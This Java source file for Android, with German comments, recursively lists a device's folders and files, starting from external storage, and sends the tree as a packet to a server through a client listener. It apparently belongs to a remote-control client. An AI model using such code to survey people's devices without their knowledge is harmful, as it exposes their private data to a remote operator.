package my.app.Library;

import java.io.File;
import java.util.ArrayList;

import my.app.client.ClientListener;

import utils.MyFile;
import Packet.FileTreePacket;
import android.content.Context;
import android.os.Environment;
/**
 * Diese Klasse ist zum Erhalten der Ordnerstruktur gedacht.
 */
public class DirLister {
	/**
	 * Zum Erstellen eines FileTreePacket.
	 * @param c	Service der die Methode aufruft
	 * @param channel Kanal zur Datenübertragung
	 * @param dirname Ordner bei dem begonnen werden soll.
	 * @return false falls der Ordner nicht existiert, true sonst.
	 */
	public static boolean listDir(ClientListener c, int channel, String dirname) {
		/**
		 * f Von hier aus wir die Ordnerstruktur duchgesucht.
		 */
		File f;
		/**
		 * ar	In dieser Liste werden die Daten über die Ornderstruktur gepseichert.
		 */
		ArrayList<MyFile> ar = new ArrayList<MyFile>();
		/**
		 * Überprüfen ob das externe Dateisystem zurückgeliefert werden soll.
		 * Hier wird dann der wurzel Ordner in f gespeicehrt.
		 */
		if(dirname.equals("/"))
			f = Environment.getExternalStorageDirectory();
		else
		/**
		 * Ansonsten einen neuen Ordner mit dem übergebenen Namen erstellen.
		 */
			f = new File(dirname);
		/**
		 * Sollte f nicht existieren beenden der Methode
		 */
		if (!f.exists()) {
			return false;
		} 
		else {
			/**
			 * Ansonsten wird die vistiAllDirsAndFiles Methode mit f als Agrument aufgerufen und das Egeniss in der ArrayList ar gespeichert.
			 */
			ar.add(visitAllDirsAndFiles(f));
			/**
			 * Neues FileTreePacket erstellen und die ArrayList übergeben.
			 * Das Paket wird danach an den Server gesendet.
			 * Zusätzlich wird true zurückgegeben.
			 */
			c.handleData(channel, new FileTreePacket(ar).build());
			return true;
		}
	}

	/**
	 * Diese Methode geht von Stratorder aus alles Ordner durch.
	 * @param dir 	Der Start Konten
	 * @param ar	Die ArrayListe in der dei daten gespeichert werden.
	 */
	public static void visitAllDirsAndFiles(File dir, ArrayList<MyFile> ar) {
		/**
		 * Überprüfen ob der Ordner existiert.
		 */
		if(dir.exists()) {
			/**
			 * Überprüfen ob es sich um einen Ordner handelt
			 */
		    if (dir.isDirectory()) {
				/**
				 * Mögliche Kinder es Ordner im StringArray auflisten.
				 */
		        String[] children = dir.list();
				/**
				 * Den Ordner der ArrayList hinzufügen.
				 */
				ar.add(new MyFile(dir));
				/**
				 * Überprüfen ob es Unterordner gibt.
				 */
		        if(children != null) {
					/**
					 * For Schleife durch alle Unterordner
					 */
			        for (String child: children) {
			        	//System.out.println(dir.toString()+"/"+child);
			        	try {
							/**
							 * Erstellen eines neuen Files wobei dir der Ordnerpfat und child der Ordnername ist
							 */
			        		File f = new File(dir, child);
							/**
							 * Rekursiver aufruf der Methode vistiAllDirsAndFiles
							 */
			        		visitAllDirsAndFiles(f, ar);
			        	}
			        	catch(Exception e) {
			        		System.out.println("Child !"+child);
			        		e.printStackTrace();
			        	}
			        }
		        }
		    }
		    else
			/**
			 * Wenn kein Ordner dir als neuen MyFile zu ar hinzufügen.
			 */
		    	ar.add(new MyFile(dir));
		}
	}

	/**
	 * Diese Methode listet alle Ordner und Unterordner ab dem Order dir auf.
	 * @param dir	Wurzelordner
	 * @return der Ordner
	 */
	public static MyFile visitAllDirsAndFiles(File dir) {
		/**
		 * Überprüfen ob der Ordner dir existiert.
		 */
		if(dir.exists()) {
			/**
			 * Überprüfen ob dir ein Ordner ist
			 */
		    if (dir.isDirectory()) {
				/**
				 * Unterordern/Datein von Dir auflisten und in children speichern.
				 */
		        String[] children = dir.list();
				/**
				 * Neuen Ordener für dir erstellen
				 */
		        MyFile myf = new MyFile(dir);
		        //ar.add(new MyFile(dir));
				/**
				 * Überprüfen ob es Kinder gibt.
				 */
		        if(children != null) {
					/**
					 * Überprüfen ob das Array eine Länge !=0 hat
					 */
		        	if(children.length != 0) {
						/**
						 * For-Schleife durch alle Elemente des Arrays children
						 */
				        for (String child: children) {
				        	//System.out.println(dir.toString()+"/"+child);
				        	try {
								/**
								 * Verscuhen ob ein neuer Ordner mit dem Pfar dir und dem Namen Child erstellt werden kann
								 */
				        		File f = new File(dir, child);
								/**
								 * rekursiver Aufruf der Methode.
								 */
				        		myf.addChild(visitAllDirsAndFiles(f));
				        	}
				        	catch(Exception e) {
								/**
								 * Sonst ist es eine Datei und kein unterordner mehr.
								 */
				        		System.out.println("Child !"+child);
				        		e.printStackTrace();
				        	}
				        }
		        	}
		        }
				/**
				 * myf zurücliefern
				 */
	        	return myf;
		    }
		    else
			/**
			 * Keine Unterordner daher wird nur der File dir zurückgegeben
			 */
		    	return new MyFile(dir);
		}
		/**
		 * Ornder existiert nicht daher wird null zurückgeliefert.
		 */
		return null;
	}
	
}
